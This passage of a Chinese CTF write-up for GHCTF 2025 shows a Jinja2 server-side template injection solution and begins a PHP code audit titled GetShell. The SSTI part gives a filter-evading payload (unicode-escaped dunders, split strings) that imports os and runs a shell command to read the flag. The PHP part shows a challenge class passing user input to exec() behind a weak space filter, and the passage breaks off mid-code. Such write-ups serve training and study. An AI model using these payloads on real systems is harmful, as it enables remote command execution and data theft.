&#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.Authorization&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.auth.WWWAuthenticate&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.headers.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.file_storage.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.range.ContentRange&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._KW_ONLY_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;importlib._abc.Loader&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;werkzeug.test.Cookie&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;platform._Processor&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;flask.json.provider.JSONProvider&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.converters.BaseConverter&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RulePart&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.rules.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.State&#x27;&gt;, &lt;class &#x27;werkzeug.routing.matcher.StateMachineMatcher&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.map.MapAdapter&#x27;&gt;, &lt;class &#x27;_csv.Dialect&#x27;&gt;, &lt;class &#x27;_csv.reader&#x27;&gt;, &lt;class &#x27;_csv.writer&#x27;&gt;, &lt;class &#x27;csv.Dialect&#x27;&gt;, &lt;class &#x27;csv.DictReader&#x27;&gt;, &lt;class &#x27;csv.DictWriter&#x27;&gt;, &lt;class &#x27;csv.Sniffer&#x27;&gt;, &lt;class &#x27;pathlib._Flavour&#x27;&gt;, &lt;class &#x27;pathlib._Accessor&#x27;&gt;, &lt;class &#x27;pathlib._Selector&#x27;&gt;, &lt;class &#x27;pathlib._TerminatingSelector&#x27;&gt;, &lt;class &#x27;pathlib.PurePath&#x27;&gt;, &lt;class &#x27;zipfile.ZipInfo&#x27;&gt;, &lt;class &#x27;zipfile.LZMACompressor&#x27;&gt;, &lt;class &#x27;zipfile.LZMADecompressor&#x27;&gt;, &lt;class &#x27;zipfile._SharedFile&#x27;&gt;, &lt;class &#x27;zipfile._Tellable&#x27;&gt;, &lt;class &#x27;zipfile.ZipFile&#x27;&gt;, &lt;class &#x27;zipfile.Path&#x27;&gt;, &lt;class &#x27;textwrap.TextWrapper&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.MetaPathFinder&#x27;&gt;, &lt;class &#x27;importlib.abc.PathEntryFinder&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;importlib.metadata.Sectioned&#x27;&gt;, &lt;class &#x27;importlib.metadata.Deprecated&#x27;&gt;, &lt;class &#x27;importlib.metadata.FileHash&#x27;&gt;, &lt;class &#x27;importlib.metadata.Distribution&#x27;&gt;, &lt;class &#x27;importlib.metadata.DistributionFinder.Context&#x27;&gt;, &lt;class &#x27;importlib.metadata.FastPath&#x27;&gt;, &lt;class &#x27;importlib.metadata.Lookup&#x27;&gt;, &lt;class &#x27;importlib.metadata.Prepared&#x27;&gt;, &lt;class &#x27;blinker._utilities.Symbol&#x27;&gt;, &lt;class &#x27;blinker.base.Signal&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils._MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;flask.sansio.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.sansio.blueprints.BlueprintSetupState&#x27;&gt;]&quot;</span></span><br><span class="line"></span><br><span class="line">array_result = string.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> key,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(array_result):</span><br><span class="line">    char = re.sub(<span class="string">r&#x27;[\[\]]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><p>寻找与os相关的函数</p><img src="/CTFwp/GHCTF-2025/image-20250706111448337.png" class="" title="image-20250706111448337"><p>137初始化后是一个函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\u005f\u005fclass\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fbase\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fsub&#x27;</span><span class="string">&#x27;classes\u005f\u005f&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;\u005f\u005finit\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fglobals\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fbuil&#x27;</span><span class="string">&#x27;tins\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fimport\u005f\u005f&#x27;</span>](<span class="string">&#x27;o&#x27;</span><span class="string">&#x27;s&#x27;</span>).popen(<span class="string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/GHCTF-2025/image-20250706111540423.png" class="" title="image-20250706111540423"><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigLoader</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;log_level&#x27;</span> =&gt; <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_input_length&#x27;</span> =&gt; <span class="number">100</span>,</span><br><span class="line">            <span class="string">&#x27;min_password_length&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">            <span class="string">&#x27;allowed_actions&#x27;</span> =&gt; [<span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>]</span><br><span class="line">        ]; <span class="comment">// 1 初始化了一些内容；返回到原先代码处。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;config[<span class="variable">$key</span>] ?? <span class="literal">null</span>; <span class="comment">// 2 返回config属性指定键的值，返回到原先代码处。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logLevel</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logLevel</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logLevel = <span class="variable">$logLevel</span>; <span class="comment">// 3 初始化logLevel属性 为 info</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$level</span> = <span class="string">&#x27;info&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> === <span class="variable language_">$this</span>-&gt;logLevel) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[LOG] <span class="subst">$message</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Username must be at least 5 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Password must be at least 8 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>] = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_BCRYPT);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>]) &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;users[<span class="variable">$username</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Authentication failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$x</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="title function_ invoke__">ceil</span>(<span class="variable">$length</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>)))), <span class="number">1</span>, <span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputValidator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$maxLength</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$maxLength</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maxLength = <span class="variable">$maxLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable language_">$this</span>-&gt;maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Input exceeds maximum length of <span class="subst">&#123;$this-&gt;maxLength&#125;</span> characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 7 限制长度 ，要小于 100 返回到原先代码处</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>; <span class="comment">// 5 logger实例化对象赋值给logger属性；返回到原先代码处</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123; <span class="comment">// 8</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123; <span class="comment">// 禁用了空格</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>); <span class="comment">// 执行命令 ，将命令结果写入 $output</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>); <span class="comment">// 输出命令</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>); <span class="comment">// 返回到原先代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$executor</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>; <span class="comment">// config实例化对象赋值给config属性</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>; <span class="comment">// logger实例化对象赋值给logger属性</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;executor = <span class="keyword">new</span> <span class="title class_">CommandExecutor</span>(<span class="variable">$logger</span>); <span class="comment">// 创建CommandExecutor实例，跟进CommandExecutor类 5</span></span><br><span class="line">        <span class="comment">// 返回到原先代码处</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;allowed_actions&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid action&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123; <span class="comment">// 主要看这一段</span></span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title 